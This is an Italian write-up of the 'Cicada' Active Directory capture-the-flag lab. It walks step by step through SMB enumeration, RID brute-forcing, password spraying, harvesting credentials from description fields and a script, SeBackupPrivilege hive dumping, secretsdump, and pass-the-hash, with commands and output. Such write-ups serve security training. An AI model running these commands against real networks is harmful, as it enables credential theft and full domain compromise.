+++
date = '2026-07-11T03:17:55+02:00'
draft = false
title = 'Cicada Writeup IT'
+++
**Nome**: **`joy.scd01`**

**Data**: **`28/01/2025`**

![Cicada.png](/images/imgs_cicada/Cicada.png)

---
# Introduzione 

**_Cicada_** è un ambiente **Active Directory** di livello **Easy**. Una delle prime **AD** che io abbia mai affrontato. Illustra perfettamente come una scarsa igiene delle password e share eccessivamente permissive possano portare ad una compromissione totale del dominio.

Il punto d'accesso iniziale si basa fortemente sull'enumerazione **SMB**. Partendo da un accesso anonimo/Guest, ho trovato una lettera di benvenuto contenente una password aziendale di default. Sfruttando il **RID Brute-forcing**, ho generato una lista di utenti validi e ho eseguito un **password spraying** per compromettere il primo account. Il lateral movement ha richiesto un'enumerazione meticolosa: controllare le descrizioni degli utenti ha rivelato la password di un secondo utente, che a sua volta ha sbloccato una nuova share **SMB**. Al suo interno, uno script di backup conteneva le credenziali di un terzo utente, garantendo l'accesso **WinRM**.
Per la privilege escalation, l'utente compromesso aveva abilitato il **`SeBackupPrivilege`**, di cui ho abusato per dumpare i **registry hive**, estrarre l'hash locale dell'**Administrator** e ottenere la compromissione totale del dominio tramite un attacco **Pass-The-Hash**.

---
# Tecniche Utilizzate

- **RID Brute-forcing & Password Spraying**

- **Privilege Escalation via SeBackupPrivilege**

- **Dump dei Registry Hive**

- **Pass-The-Hash**

---
# Enumerazione

## nmap

Scansione iniziale di tutte le porte:

```bash
nmap -p- -Pn cicada
```

```text
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
60286/tcp open  unknown
```

Scansione mirata con script e rilevamento servizi:

```bash
nmap -sC -sV -Pn cicada
```

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-11 04:09:41Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-07-11T04:11:03+00:00; +5h01m15s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-07-11T04:11:03+00:00; +5h01m15s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-07-11T04:11:03+00:00; +5h01m15s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-11T04:11:03+00:00; +5h01m15s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-11T04:10:24
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 5h01m14s, deviation: 0s, median: 5h01m14s
```

Le scansioni hanno rilevato delle porte aperte standard per **Active Directory**.

Ho aggiunto **`cicada.htb`** e **`cicada-dc.cicada.htb`** al mio file **`/etc/hosts`**.

## Enumerazione SMB

Ho iniziato controllando l'accesso anonimo o Guest sul servizio **SMB** utilizzando **NetExec**:

```bash
nxc smb cicada.htb -u 'Guest' -p '' --shares
```

![smb.png](/images/imgs_cicada/smb.png)

L'output ha mostrato l'accesso a una share chiamata **`HR`**. Mi sono connesso ad essa usando **`smbclient`**:

```bash
smbclient \\\\cicada.htb\\HR -U Guest
```

![smbclient.png](/images/imgs_cicada/smbclient.png)

All'interno, ho trovato un documento chiamato **`Notice from HR.txt`**. L'ho scaricato e ne ho letto il contenuto:

```text
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:
...
```

La nota leakava una password aziendale di default:
- **`Cicada$M6Corpb*@Lp#nZp!8.*`**.

---
# Accesso Iniziale | RID Brute-forcing & Password Spraying

Per utilizzare questa password, avevo bisogno di una lista di utenti di dominio validi. Avendo accesso Guest tramite **SMB**, ho utilizzato **NetExec** per eseguire un attacco di **RID Brute-force** contro il **Domain Controller**:

```bash
nxc smb cicada.htb -u 'Guest' -p '' --rid-brute
```

![ridbrute.png](/images/imgs_cicada/ridbrute.png)

Questo ha dumpato con successo gli utenti del dominio. Ho pulito l'output e l'ho salvato in un file chiamato **`users`**:

```text
Administrator
Guest
krbtgt
CICADA-DC$
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

Con una lista di utenti validi e la password di default leakata, ho eseguito un **Password Spraying**:

```bash
nxc smb cicada.htb -u users -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```

![spraying.png](/images/imgs_cicada/spraying.png)

Ho ottenuto un match per l'utente **`michael.wrightson`**.

---
# Lateral Movement | Michael → David

Ho controllato se **Michael** avesse accesso a **WinRM** per ottenere una shell, ma il tentativo è fallito. Ho anche cercato nuove share **SMB** o informazioni **RID** aggiuntive, ma nulla di nuovo.

Qui mi sono bloccato per un momento, poi mi sono ricordato della flag **`--users`** per **nxc** e ho fatto un tentativo. Ho fatto centro nel campo **Description di Active Directory**:

```bash
nxc smb cicada.htb -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

![cleartextpw.png](/images/imgs_cicada/cleartextpw.png)

**Nota**: _Gli **Amministratori** o gli utenti lasciano spesso informazioni sensibili (come password temporanee) nei campi **Description di Active Directory**. Interrogare questi campi è un passaggio fondamentale nell'enumerazione interna di **AD**._

---
# Lateral Movement | David → Emily

Ho controllato l'accesso **WinRM** per **David**, ma di nuovo nessuna shell. Così ho ricominciato l'enumerazione **SMB** utilizzando il suo account:

```bash
nxc smb cicada.htb -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares
```

Questa volta, avevo permessi di lettura su una nuova share chiamata **`DEV`**. Mi sono connesso ad essa:

```bash
smbclient \\\\cicada.htb\\DEV -U david.orelious
```

![smbclient2.png](/images/imgs_cicada/smbclient2.png)

All'interno, ho trovato uno script **PowerShell** chiamato **`Backup_script.ps1`**. L'ho scaricato e ne ho letto il contenuto:

![emily.png](/images/imgs_cicada/emily.png)

Lo script conteneva le credenziali per un terzo utente:

- **`emily.oscars:Q!<REDACTED>Vt`**.

Ho testato queste credenziali contro **WinRM**:

```bash
nxc winrm cicada.htb -u 'emily.oscars' -p 'Q!<REDACTED>Vt'
```

**`(Pwn3d!)`**.

Finalmente un accesso iniziale effettivo con **Evil-WinRM**:

```bash
evil-winrm -i cicada.htb -u emily.oscars -p 'Q!<REDACTED>Vt'
```

![initialroof.png](/images/imgs_cicada/initialproof.png)

La **user flag** era situata in **`C:\Users\emily.oscars\Desktop\user.txt`**.

---
# Privilege Escalation | SeBackupPrivilege

Una volta loggato, ho controllato i privilegi con **`whoami /priv`**.

![lhf.png](/images/imgs_cicada/lhf.png)

Ho notato che l'account possedeva il **`SeBackupPrivilege`**.

**Nota**: _Il **`SeBackupPrivilege`** è progettato per consentire agli utenti di eseguire il backup di file e directory, bypassando tutti i permessi di sicurezza in lettura dei file. Dalla prospettiva di un attaccante, questo significa che possiamo leggere qualsiasi file sul sistema, indipendentemente dalla sua **ACL**. Cosa più importante, ci permette di creare copie dei **registry hive SAM** (**Security Account Manager**) e **SYSTEM**, che memorizzano gli hash degli utenti locali._

Per sfruttare questo permesso, ho utilizzato il comando **`reg save`** per dumpare gli hive nella directory corrente:

```powershell
reg save hklm\sam SAM.hive
reg save hklm\system SYSTEM.hive
```

Ho poi scaricato entrambi gli hive sulla mia macchina attaccante utilizzando il comando download in **Evil-WinRM**:

```powershell
download SAM.hive
download SYSTEM.hive
```

Una volta trasferiti, ho utilizzato **`secretsdump.py`** di **Impacket** per estrarre gli hash locali:

```bash
python3 -m venv venv 

source venv/bin/activate

pip3 install impacket

secretsdump.py -sam SAM.hive -system SYSTEM.hive LOCAL
```

```text
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b<REDACTED>41:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```

## Pass-The-Hash verso SYSTEM

Con l'**NT hash**, ho eseguito un **Pass-The-Hash** utilizzando **Evil-WinRM** per loggarmi come **Administrator**:

```bash
evil-winrm -i cicada.htb -u Administrator -H '2b<REDACTED>41'
```

![systemproof.png](/images/imgs_cicada/systemproof.png)

Qui ho preso la **root flag**.

---
# Considerazioni Finali

**_Cicada_** è essenzialmente una masterclass sul controllare ogni cosa due volte.

Questo ambiente evidenzia i pericoli dell'errore umano: lasciare password di default in share pubbliche, scrivere dati sensibili nei campi description di **Active Directory** e inserire credenziali all'interno degli script. Il **`SeBackupPrivilege`** è un **Low-Hanging Fruit** che equivale a consegnare le chiavi del dominio.